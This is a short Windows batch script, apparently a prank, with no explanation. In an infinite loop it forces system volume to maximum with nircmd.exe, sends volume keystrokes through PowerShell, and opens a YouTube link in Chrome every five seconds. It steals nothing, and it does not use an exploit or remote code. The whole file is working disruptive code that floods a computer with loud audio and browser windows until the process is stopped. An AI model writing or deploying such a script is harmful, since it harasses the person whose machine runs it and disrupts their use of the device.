@echo off

:loop
"%USERPROFILE%\AppData\Local\nircmd.exe" setsysvolume 65535
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]173)"
powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175)"
start chrome "https://youtu.be/LQ4w9xiHkrY?si=q3GcICU1yIViiOmu"
timeout /t 5 /nobreak >nul
goto loop
